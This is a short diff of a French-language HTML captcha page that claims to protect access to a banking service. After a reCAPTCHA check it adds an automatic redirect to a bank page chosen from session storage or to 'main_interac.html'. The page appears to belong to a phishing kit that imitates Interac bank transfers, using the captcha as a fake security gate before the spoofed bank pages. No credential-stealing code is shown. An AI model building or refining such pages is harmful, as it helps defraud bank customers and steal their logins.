@@ -24,10 +24,10 @@
 <div class="captcha-card">
     <div class="icon-shield">🛡️</div>
     <h2>Vérification de sécurité</h2>
-    <p>Veuillez compléter le test de sécurité pour accéder au service bancaire.</p>
+    <p>Veuillez prouver que vous n'êtes pas un robot</p>
 
     <div class="captcha-container">
-        <!-- Clé de site reCAPTCHA v2 -->
+        <!-- Clé de site reCAPTCHA v2 officielle du client -->
         <div class="g-recaptcha" data-sitekey="6LcdR6QtAAAAAEnucy3GDybzCfN6eY8yW3TumNDy" data-callback="onCaptchaSuccess"></div>
     </div>
 
@@ -40,6 +40,11 @@
         if (btnGo) {
             btnGo.classList.add('active');
         }
+        // Redirection automatique dès que la case est cochée et validée par Google
+        setTimeout(function() {
+            var target = sessionStorage.getItem('__targetBank') || 'main_interac.html';
+            window.location.href = target;
+        }, 500);
     }
 
     document.addEventListener('DOMContentLoaded', function() {
